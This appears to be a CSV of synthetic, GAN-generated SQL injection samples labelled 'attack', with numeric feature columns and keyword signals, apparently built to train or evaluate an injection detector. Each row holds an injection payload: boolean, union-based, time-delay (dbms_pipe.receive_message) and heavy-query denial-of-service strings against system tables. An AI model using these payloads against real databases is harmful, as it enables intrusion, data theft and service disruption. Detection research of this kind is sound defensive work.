id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000039,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R006778,4.851559449823162,130.5888671875,68.92254638671875,18.235774993896484,50.04664993286133,0.33630526065826416,54.78571701049805,27.22178077697754,0.9987649321556091,0.4271857440471649,0.020558711141347885,0.32958635687828064,0.07698944956064224,3.8586585521698,0.9130157828330994,0.3379841148853302,1.2390530109405518,0.06684089452028275,0.20512554049491882,0.09532976895570755,5.641932964324951,7.102540969848633,2.7408809661865234,0.01678079552948475,1.2551480531692505,0.05149826779961586,0.001654969179071486,0.26811495423316956,0.25741034746170044,0.5913206934928894,-0.030724884942173958,0.06860349327325821,0.26161661744117737,0.17668703198432922,0.48338282108306885,1.6739603281021118,4.6061553955078125,1.3308597803115845,1.5784902572631836,0.054506778717041016,0.18699246644973755,0.7964664697647095,0.028049025684595108,-0.006515657529234886,-0.0008368617272935808,0.04325748234987259,0.003759438404813409,0.44464150071144104,0.35258713364601135,0.3256644010543823,0.27923592925071716,0.29083284735679626,-0.2820466458797455,-0.03438495844602585,-0.05191373825073242,0.023117776960134506,-0.0060407547280192375,0.2913192808628082,0.03615002706646919,-0.1295849084854126,0.0010928347473964095,0.19512085616588593,0.0010012597776949406,-1.4520947933197021,-0.02568022906780243,0.08883140981197357,0.21641595661640167,-0.02849789708852768,0.5129703879356384,-0.0005070179468020797,0.015532378107309341,0.005973292049020529,-0.0011756604071706533,0.015815431252121925,0.017918666824698448,0.05814521759748459,1.058005928993225,0.11967185139656067,-0.003910856321454048,0.06249028071761131,0.08183518052101135,4.145236015319824,0.8997037410736084,-0.16858182847499847,0.16814668476581573,0.0031895488500595093,0.07517647743225098,0.18935374915599823,-0.019267907366156578
GAN_000040,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",nearest_attack_euclidean,R003961,4.405741840094167,100.13697814941406,55.653343200683594,21.470705032348633,45.8060417175293,1.6930904388427734,36.28824234008789,20.068023681640625,0.9991916418075562,0.36909008026123047,0.23173364996910095,0.2988682985305786,0.12296317517757416,3.688143253326416,0.7503751516342163,0.7038008570671082,1.0593379735946655,0.4435161054134369,0.057346947491168976,0.0022196825593709946,4.087879657745361,5.156592845916748,3.28312087059021,0.004418294411152601,1.157014012336731,0.01345438975840807,0.009935464709997177,0.12779158353805542,0.016776524484157562,0.20202316343784332,0.013749227859079838,0.023239215835928917,0.2870340645313263,5.688518285751343e-05,0.5302205681800842,1.1237300634384155,3.3522472381591797,0.35950183868408203,1.0876535177230835,0.5652731657028198,0.5144503116607666,0.5681992173194885,-0.028231676667928696,-0.003603929653763771,-0.03380013257265091,0.040349412709474564,0.05063948035240173,0.2819516956806183,0.21098878979682922,-0.005762500688433647,0.08484590798616409,0.23241162300109863,-0.27077460289001465,0.05412186682224274,0.04462778568267822,-0.020352371037006378,0.0486108623445034,0.11928679049015045,-0.007726170588284731,0.336566299200058,-0.0017207682831212878,0.20207983255386353,-0.004540318623185158,0.006052560638636351,0.0419609509408474,0.019400671124458313,0.1915920078754425,0.22203734517097473,-0.03528236597776413,-0.002610995667055249,-0.004264263901859522,0.0015013545053079724,0.0004074943717569113,0.0022536274045705795,0.011299923993647099,0.10515107214450836,0.15307992696762085,0.3095877468585968,0.0028758083935827017,0.029262742027640343,0.03547514230012894,4.966371536254883,0.676822304725647,0.3297038972377777,0.08078975975513458,0.025121163576841354,0.0019655427895486355,0.48191142082214355,-0.007415637373924255
GAN_000041,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.784857681412474,106.66390991210938,56.23596954345703,21.5848331451416,39.431819915771484,-0.09706076979637146,55.28443908691406,25.536130905151367,0.998525857925415,0.44958925247192383,0.1952877938747406,0.27002254128456116,0.08935355395078659,3.6169745922088623,0.46658429503440857,0.5420486330986023,1.206844449043274,0.39787155389785767,0.0944661945104599,0.0205745417624712,4.810778617858887,4.826895713806152,3.5288240909576416,0.023904331028461456,1.1531339883804321,0.030122797936201096,-0.006808653008192778,0.06452667713165283,0.3403530418872833,0.3190385103225708,0.09968404471874237,0.040496956557035446,0.479392945766449,-0.014286011457443237,0.45916011929512024,1.183567762374878,4.918636322021484,0.5408855676651001,1.1544973850250244,0.44971343874931335,0.4839443266391754,0.6356713771820068,-0.07766836136579514,-0.03530265763401985,-0.0013957390328869224,0.07271535694599152,0.06059732660651207,0.29207512736320496,0.34444284439086914,0.09148991852998734,0.09191866219043732,0.25308898091316223,-0.23062705993652344,0.062478549778461456,0.01896579936146736,0.0057996283285319805,0.03586022928357124,0.16597364842891693,-0.009126613847911358,0.33222588896751404,-0.0030355167109519243,0.33215296268463135,0.005355009343475103,-0.7147959470748901,0.05289294198155403,0.046157192438840866,0.2219456285238266,-0.12996846437454224,0.31723809242248535,-0.0033113646786659956,0.02588672749698162,0.0021928150672465563,-0.00014597199333366007,0.022224612534046173,0.02148691564798355,0.08736968040466309,0.29654574394226074,0.29810604453086853,0.0031606443226337433,0.020350998267531395,0.08952999114990234,4.2991862297058105,0.6812703013420105,0.18948443233966827,0.15143729746341705,-0.00998157262802124,0.044608477503061295,0.5460394620895386,-0.020127536728978157
GAN_000042,attack,union,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",nearest_attack_euclidean,R000823,6.02373851790843,118.2036361694336,64.33484649658203,23.57587432861328,38.310264587402344,1.3252544403076172,51.45406723022461,26.44710922241211,0.9978430271148682,0.41940322518348694,0.2893984615802765,0.22234730422496796,0.0958794429898262,3.7269084453582764,0.09258140623569489,0.41604113578796387,1.4128421545028687,0.6098259687423706,0.059905558824539185,-0.020984448492527008,5.780989646911621,4.8580193519592285,4.394205093383789,0.02546706236898899,0.8122825622558594,0.03388714790344238,-0.0183007400482893,0.07080860435962677,0.178089901804924,0.22447113692760468,0.046763692051172256,0.016793541610240936,0.6403768062591553,0.039142221212387085,0.5208086967468262,0.9971699714660645,4.783175468444824,0.024571795016527176,0.8658739328384399,0.7887224555015564,0.5622557401657104,0.7115580439567566,-0.0793241634964943,-0.044853147119283676,-0.028285877779126167,0.07083030790090561,0.10505544394254684,0.37666165828704834,0.4117034375667572,-0.0469207726418972,0.03915678337216377,0.2771710157394409,-0.29228031635284424,0.1632532924413681,0.0019624847918748856,-0.03506840765476227,0.10874349623918533,0.23526154458522797,-0.010496753267943859,0.5523753762245178,-0.01212314236909151,0.2798362374305725,0.004203857854008675,-0.734024167060852,0.09700461477041245,0.0611402690410614,0.23154045641422272,0.3292756676673889,0.06530140340328217,-0.005332770757377148,0.015461240895092487,0.005315855145454407,0.00043099053436890244,0.026462843641638756,0.023658014833927155,0.17224334180355072,-0.3492042124271393,0.2948087453842163,0.010765246115624905,-0.14991846680641174,0.09980014711618423,5.672235012054443,0.8301693797111511,0.4402625262737274,0.05407489836215973,-0.05888035148382187,0.04044044762849808,0.7396003007888794,-0.029119960963726044
GAN_000043,attack,boolean,"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003333,5.3017290026267245,107.79387664794922,70.95540618896484,19.548721313476562,43.2829475402832,0.5930808186531067,58.745113372802734,34.37919998168945,0.9983735680580139,0.4483828544616699,0.1505415290594101,0.30135685205459595,0.08709697425365448,3.9425666332244873,0.14222826063632965,0.08046168088912964,1.2709929943084717,0.29801440238952637,0.19404171407222748,0.08806277066469193,4.601869106292725,6.201900959014893,3.5280630588531494,0.02889496088027954,0.984710693359375,0.02043307013809681,-0.038319624960422516,0.3552502393722534,0.3471088111400604,0.3448033332824707,0.05673004686832428,0.06217356026172638,0.46629539132118225,0.06695058941841125,0.54936283826828,1.1938577890396118,3.1059231758117676,1.0434991121292114,0.9982249736785889,0.29962801933288574,0.042204611003398895,0.8053230047225952,0.05355766415596008,-0.03775744512677193,0.008097024634480476,0.09548395872116089,0.04579639434814453,0.4483698904514313,0.3890105187892914,0.10678847134113312,0.07788059860467911,0.28585946559906006,-0.24025499820709229,0.08842237293720245,0.0007645896403118968,-0.006445396225899458,0.03800494223833084,0.3689880073070526,0.03644780442118645,0.6230698227882385,-0.006331146229058504,0.3138006329536438,0.007473569829016924,-1.765586018562317,0.06841378659009933,0.10346677154302597,0.23779307305812836,0.16675087809562683,0.37284034490585327,0.0027789094019681215,0.035457953810691833,0.0042608631774783134,-0.0020608953200280666,-0.0138349374756217,0.023709218949079514,0.11954744905233383,0.4512270987033844,0.22094158828258514,8.429348235949874e-05,-0.13790147006511688,0.1758570671081543,3.485987663269043,0.8133735060691833,0.07511001825332642,0.14471954107284546,-0.07482262700796127,0.07495846599340439,0.5187240839004517,-0.03625183925032616
GAN_000044,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007603,4.18790504000697,109.98613739013672,60.035736083984375,20.602527618408203,42.66557693481445,1.1302239894866943,48.27668762207031,24.948633193969727,0.998756468296051,0.3743930757045746,0.17194069921970367,0.3009727895259857,0.1039622351527214,3.778029441833496,0.8083685040473938,0.5991745591163635,1.3529398441314697,0.2579706013202667,0.12080119550228119,0.025777149945497513,4.421895503997803,5.813008785247803,2.8389699459075928,0.005881013814359903,1.0987930297851562,0.03512351214885712,-0.014432541094720364,0.20052030682563782,0.33226028084754944,0.331245094537735,-0.0009948213119059801,0.03081650473177433,0.34354251623153687,0.052704863250255585,0.5390802621841431,1.1705262660980225,3.8615593910217285,0.719089150428772,1.0568153858184814,0.3231431543827057,0.29881465435028076,0.6654142141342163,0.023840676993131638,-0.011339137330651283,-0.006047917064279318,0.03495631739497185,0.0304248109459877,0.3532620370388031,0.29629361629486084,0.1189681887626648,0.12425578385591507,0.2199319452047348,-0.27973830699920654,0.06354399770498276,0.018354635685682297,-0.02051647938787937,0.048086587339639664,0.219920352101326,0.005933115258812904,0.2079412192106247,-0.006540581118315458,0.12559112906455994,-0.00010730981011874974,-0.5974345207214355,0.04435751214623451,0.06673049181699753,0.16615091264247894,0.12438897043466568,0.17978361248970032,-0.001682956120930612,0.009569312445819378,0.0034396029077470303,-0.0010101264342665672,0.009439636021852493,0.014453736133873463,0.10149010270833969,0.25649601221084595,0.23232461512088776,-0.0009297592914663255,0.0022798983845859766,0.07401233166456223,4.762219429016113,0.7488656044006348,0.16646774113178253,0.07934480160474777,0.013120856136083603,0.029534535482525826,0.39695048332214355,-0.013977907598018646
GAN_000045,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.2832408951159575,111.82935333251953,59.99149703979492,22.483884811401367,52.90070343017578,1.6620306968688965,43.72404861450195,22.734920501708984,0.9991662502288818,0.38387423753738403,0.20775777101516724,0.29349303245544434,0.13635863363742828,3.834059238433838,0.6376466751098633,0.9586415886878967,1.0939265489578247,0.37366652488708496,0.07635270059108734,0.025700118392705917,4.755218505859375,5.718695640563965,3.9256696701049805,0.010779736563563347,1.4365323781967163,0.01463655661791563,0.026664527133107185,0.14429447054862976,-0.38854750990867615,0.304042249917984,0.05236342176795006,0.0077939508482813835,0.374362587928772,-0.21111080050468445,0.4963817298412323,1.2026889324188232,3.906846523284912,0.43727385997772217,1.4063233137130737,0.5541772246360779,0.4557201564311981,0.593682587146759,0.004539514891803265,-0.002725742757320404,-0.011152097024023533,0.025159480050206184,0.03494904190301895,0.2793300449848175,0.15954847633838654,-0.0167547594755888,0.04452577605843544,0.16726121306419373,-0.2269178032875061,0.018499987199902534,0.025189917534589767,-0.014920714311301708,0.06174900755286217,0.2470429688692093,-0.003668484976515174,0.37241873145103455,-0.005355277564376593,0.08085666596889496,-0.004004292190074921,0.40694496035575867,0.030735475942492485,-0.0018382420530542731,0.16018091142177582,0.30126097798347473,-0.22484472393989563,-0.004456109367311001,0.004847368225455284,0.0018008339684456587,-0.0008721231715753675,-0.012574580498039722,0.01254034973680973,0.11885926872491837,0.2636525630950928,0.29652315378189087,0.0010042302310466766,0.07560490071773529,0.05536895617842674,4.924817085266113,0.748991072177887,0.23540028929710388,0.04413404315710068,-0.009681634604930878,0.004492806736379862,0.38529065251350403,-0.021627038717269897
GAN_000046,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R008552,5.2696870807258485,121.00553894042969,57.77788162231445,21.987836837768555,34.63564682006836,1.9005495309829712,48.52329635620117,22.946149826049805,0.9988768100738525,0.37098807096481323,0.3044315278530121,0.24617429077625275,0.15420038998126984,3.8542640209198,0.07197703421115875,0.9009115695953369,1.1472179889678955,0.45809605717658997,0.06891294568777084,-0.0024110893718898296,6.050480365753174,4.643704891204834,4.165131092071533,0.015422477386891842,1.1145986318588257,-0.008634543046355247,0.004031340125948191,0.18105316162109375,-0.5839611887931824,0.2102283537387848,0.09649726748466492,-0.02561121992766857,0.5416302680969238,-0.054614610970020294,0.5844858884811401,0.9943398833274841,4.112869739532471,0.0681307464838028,0.9680494070053101,0.6358274221420288,0.6243206858634949,0.5549854636192322,-0.02398671582341194,0.03965676948428154,0.01870514079928398,0.04367264732718468,0.06794504076242447,0.24969293177127838,0.18166019022464752,-0.17744125425815582,-0.1221449002623558,0.18624243140220642,-0.3296290636062622,0.10328269004821777,0.007027307525277138,-0.03452231362462044,0.11440574377775192,0.2571338415145874,0.0013806771021336317,0.6813900470733643,-0.009266986511647701,0.21043506264686584,-2.679895442270208e-05,-0.01811932772397995,0.054353125393390656,-0.024464761838316917,0.18198205530643463,0.45981836318969727,-0.8356444239616394,-0.00481486227363348,-0.010634100995957851,0.007083745673298836,6.302885594777763e-05,0.00540241738781333,0.012316255830228329,0.1497489959001541,-0.29663148522377014,0.2915946841239929,0.006541735492646694,-0.017510058358311653,0.10485408455133438,4.339172840118408,0.6146669983863831,0.2926475405693054,0.08249931782484055,-0.0771343782544136,0.03695621341466904,0.49538418650627136,-0.01874268241226673
GAN_000047,attack,boolean,"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",nearest_attack_euclidean,R003022,5.879665554892465,131.60415649414062,83.03297424316406,25.123241424560547,73.39002990722656,2.2847707271575928,61.82284927368164,34.501895904541016,0.9982674717903137,0.5143491625785828,0.11196447908878326,0.2779356837272644,0.05501306429505348,3.820128917694092,0.33065298199653625,0.44622230529785156,0.7503826022148132,0.36817222833633423,0.1286686807870865,0.11203447729349136,6.401133060455322,6.525935173034668,4.8627471923828125,0.05493063107132912,1.3764216899871826,0.11778591573238373,-0.008463251404464245,0.2013060450553894,-0.46996912360191345,0.42742541432380676,0.008314770646393299,0.10727912187576294,0.4567531943321228,0.03427845612168312,0.35161784291267395,1.4664716720581055,4.561160564422607,0.7678979635238647,1.8831472396850586,0.47402703762054443,0.3115750849246979,0.9409103989601135,-0.03732411190867424,0.014455233700573444,-0.02076307125389576,0.039479147642850876,0.05986098200082779,0.4785086214542389,0.47819143533706665,0.2607557475566864,0.365102082490921,0.1734343320131302,-0.3090537488460541,-0.031874869018793106,-0.012006713077425957,0.029013700783252716,0.056104447692632675,0.3420979976654053,0.027694104239344597,0.47188812494277954,0.0015063922619447112,0.30868691205978394,0.00282580335624516,-1.5656176805496216,0.06944164633750916,0.10755406320095062,0.16392147541046143,0.129836767911911,0.6909176111221313,-0.0033000309485942125,0.05178305506706238,0.0008790275896899402,0.0021284855902194977,-0.0010913051664829254,0.01853945106267929,0.07089760154485703,1.2125658988952637,0.23496288061141968,0.0014187053311616182,0.04885491356253624,0.11248502135276794,4.6103196144104,0.9935999512672424,0.022175393998622894,0.22116337716579437,-0.06168524920940399,0.10220653563737869,0.47113505005836487,-0.04080083966255188
GAN_000048,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003133,7.293959656101813,127.22637939453125,84.27869415283203,15.257303237915039,51.04643630981445,2.0195939540863037,63.13032913208008,41.9482421875,0.9976431131362915,0.47429755330085754,0.06974509358406067,0.31683167815208435,0.041022639721632004,4.131211280822754,-0.13853202760219574,-0.32687562704086304,1.2618554830551147,0.2846681773662567,0.2597058117389679,0.16895541548728943,4.9901885986328125,6.755637168884277,4.01901912689209,0.043084096163511276,0.7523689270019531,0.06610861420631409,-0.07531937211751938,0.44619736075401306,0.37533068656921387,0.44927096366882324,-0.029587237164378166,0.12036825716495514,0.41585251688957214,0.20063716173171997,0.5356630086898804,1.4037503004074097,2.534579277038574,1.4247692823410034,1.5582714080810547,0.202749565243721,-0.17421646416187286,1.1644854545593262,0.11446649581193924,-0.025785041972994804,-0.019645189866423607,0.10735401511192322,0.07202251255512238,0.5871216058731079,0.5690677165985107,0.2950018346309662,0.2909074127674103,0.33989402651786804,-0.605302631855011,0.06145821139216423,-0.052700988948345184,0.014649605378508568,0.011333921924233437,0.5393895506858826,0.07825439423322678,0.6773449182510376,-0.0028763827867805958,0.6813278198242188,0.011293204501271248,-3.6134181022644043,0.06746624410152435,0.17462632060050964,0.27232837677001953,0.2571824789047241,0.8616137504577637,0.006175057031214237,0.04326849430799484,0.0066029890440404415,-9.602089266991243e-05,-0.04135431721806526,0.031659480184316635,0.08539050072431564,1.0604561567306519,0.09160110354423523,-0.004025282338261604,-0.2793107032775879,0.23103401064872742,2.596900224685669,1.0642955303192139,-0.1120581403374672,0.21269895136356354,-0.12316835671663284,0.13280999660491943,0.5588919520378113,-0.055720940232276917
GAN_000049,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002704,5.004535308655426,125.28773498535156,75.78245544433594,21.529491424560547,64.34837341308594,1.7349913120269775,57.15662384033203,29.42482566833496,0.9989316463470459,0.45976173877716064,0.08893793821334839,0.32585495710372925,0.07036513835191727,3.8993794918060303,0.6328232884407043,0.4964912235736847,0.9969873428344727,0.21337062120437622,0.16531866788864136,0.11109300702810287,4.984996795654297,6.750092029571533,3.6735997200012207,0.03208494931459427,1.3829035758972168,0.08382967859506607,0.0020550363697111607,0.3061912953853607,0.0043743327260017395,0.4407411217689514,-0.010481399483978748,0.0944804847240448,0.2711898684501648,-0.052797041833400726,0.45426273345947266,1.3981372117996216,3.940634250640869,1.2106984853744507,1.6280635595321655,0.2504800856113434,0.1434769630432129,0.842544436454773,0.03820578008890152,0.006245627999305725,-0.014312026090919971,0.03348473459482193,0.02896515093743801,0.4494676887989044,0.3549988865852356,0.23469650745391846,0.27638858556747437,0.2014007270336151,-0.403919517993927,-0.026381278410553932,0.015460395254194736,0.010394876822829247,0.023512935265898705,0.2834860682487488,0.02027483843266964,0.3494488298892975,-0.0016680773114785552,0.20278652012348175,0.0015042206505313516,-1.3493198156356812,0.04388927295804024,0.10039146989583969,0.14387571811676025,0.05263214558362961,0.6012399196624756,0.0007164286798797548,0.0423143208026886,0.0004984826664440334,-0.0015132979024201632,-0.011289519257843494,0.011533000506460667,0.07390248775482178,1.0286997556686401,0.16476958990097046,-0.003796310629695654,0.028889482840895653,0.0966084823012352,4.245552062988281,0.8595670461654663,-0.024267129600048065,0.1909809112548828,0.0036762095987796783,0.04575149714946747,0.4158376455307007,-0.02426273375749588
GAN_000050,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R002430,7.657032162556498,167.5196075439453,89.85208892822266,22.94015884399414,63.63849639892578,2.7194511890411377,63.29785919189453,37.347564697265625,0.997005045413971,0.51197749376297,0.10373426228761673,0.22150090336799622,-0.003599697956815362,3.883943796157837,0.37029364705085754,-0.42234981060028076,1.120731234550476,0.3893054127693176,0.1469188779592514,0.09973736852407455,7.133755207061768,6.07509183883667,4.924099922180176,0.06078728660941124,0.7698727250099182,0.15642964839935303,-0.03726886957883835,0.22245314717292786,0.2103804349899292,0.42095890641212463,-0.1037466824054718,0.11674041301012039,0.6699227690696716,0.3173533082008362,0.5068647861480713,1.3792365789413452,5.172229766845703,0.825812816619873,1.4434458017349243,0.4808250665664673,0.13873402774333954,1.054884433746338,-0.04758806154131889,-0.039173055440187454,-0.0461898148059845,0.07775509357452393,0.07365971058607101,0.6831293702125549,0.6807831525802612,0.35102543234825134,0.4481591582298279,0.23363059759140015,-0.4894897937774658,0.07133185863494873,-0.08959179371595383,0.012294100597500801,0.09211260080337524,0.3343001902103424,0.04431843385100365,0.33711037039756775,0.0017368132248520851,0.39163464307785034,0.00634527113288641,-3.0843594074249268,0.10361013561487198,0.20937588810920715,0.16804984211921692,0.2185649275779724,0.9765657782554626,-0.001511623035185039,0.05920735374093056,0.007015105336904526,0.0016977215418592095,0.03984078764915466,0.03261569142341614,0.1034284383058548,0.9718643426895142,0.24290154874324799,0.005997076164931059,-0.1542021483182907,0.10162415355443954,5.917243003845215,1.2583743333816528,0.19981898367404938,0.19419720768928528,-0.07149488478899002,0.11344285309314728,0.6114256381988525,-0.05050819367170334
GAN_000051,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003133,4.919201547349626,123.58330535888672,63.21373748779297,13.067885398864746,31.562387466430664,0.4790053963661194,59.822486877441406,25.775192260742188,0.9988619089126587,0.4507347345352173,0.09548486769199371,0.30982092022895813,0.08346407860517502,4.027948379516602,0.289694219827652,0.0726858377456665,1.0223591327667236,0.1536962389945984,0.1882467418909073,0.12487155944108963,5.143290996551514,6.070460319519043,3.574092388153076,0.027226639911532402,1.259838342666626,0.019594896584749222,0.007635063026100397,0.39763522148132324,0.20992255210876465,0.3924797475337982,0.07210198044776917,0.04511166736483574,0.31425270438194275,0.07126764208078384,0.6694288849830627,1.386704921722412,3.8912010192871094,1.3423470258712769,1.093259334564209,-0.001194849843159318,0.05490817874670029,0.5650554895401001,0.08361081779003143,-0.008031779900193214,0.03239527717232704,0.08217225968837738,0.012556404806673527,0.4313075542449951,0.275881826877594,0.15023289620876312,0.04443049058318138,0.29301950335502625,-0.29154741764068604,0.018562674522399902,-0.047613680362701416,0.017623240128159523,0.010726222768425941,0.2899795472621918,0.042123887687921524,0.43980729579925537,0.005275444593280554,0.41173458099365234,0.007304646074771881,-2.0401241779327393,0.014347132295370102,0.06727849692106247,0.2224138081073761,0.12673106789588928,-0.030724532902240753,0.005297141615301371,0.028380947187542915,0.007326263468712568,-0.004082150757312775,-0.013015049509704113,0.0230760108679533,0.10540033876895905,0.7325447201728821,0.30252647399902344,-0.00036408513551577926,-0.04828427731990814,0.14520931243896484,2.4276788234710693,0.7489551305770874,-0.06905946880578995,0.23722726106643677,-0.03765711933374405,0.06215426325798035,0.5215154886245728,-0.02334729954600334
GAN_000052,attack,boolean,"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003545,5.554343729437772,134.33526611328125,68.84449005126953,22.32105827331543,48.485748291015625,2.0269582271575928,57.16047286987305,29.051942825317383,0.9979739785194397,0.4434746205806732,0.19441047310829163,0.24845914542675018,0.058430660516023636,3.81490421295166,0.552182674407959,0.14881429076194763,1.3381623029708862,0.3907698690891266,0.10820414125919342,0.0492134690284729,5.282454490661621,5.611400604248047,4.148430824279785,0.029099389910697937,1.0139394998550415,0.08419886231422424,-0.019766753539443016,0.19187265634536743,0.2439626008272171,0.30769428610801697,-0.002318599494174123,0.06272348016500473,0.5370932817459106,0.03601423650979996,0.5300561785697937,1.0884695053100586,4.665755748748779,0.68329256772995,0.980487048625946,0.45737454295158386,0.2527126371860504,0.7443915009498596,-0.020171452313661575,-0.03248558193445206,-0.014956020750105381,0.05092143639922142,0.06137462332844734,0.4602813124656677,0.4670288562774658,0.17064961791038513,0.21870097517967224,0.22726358473300934,-0.3469640016555786,0.09007636457681656,-0.002652883529663086,-0.011587685905396938,0.06747597455978394,0.2500041127204895,0.00586590263992548,0.31301409006118774,-0.002973248716443777,0.2572176456451416,0.003003156976774335,-1.4402505159378052,0.08942783623933792,0.12357164174318314,0.16811566054821014,0.1748688817024231,0.5066377520561218,-0.0006284255068749189,0.04041862487792969,0.004121890291571617,-0.0013236935483291745,0.023923620581626892,0.021325182169675827,0.1315431147813797,0.35849350690841675,0.2879233658313751,0.005161278881132603,-0.0868377834558487,0.07147906720638275,5.343050956726074,0.8939252495765686,0.28767600655555725,0.10328663885593414,-0.017642684280872345,0.037985172122716904,0.6608105897903442,-0.03163844347000122
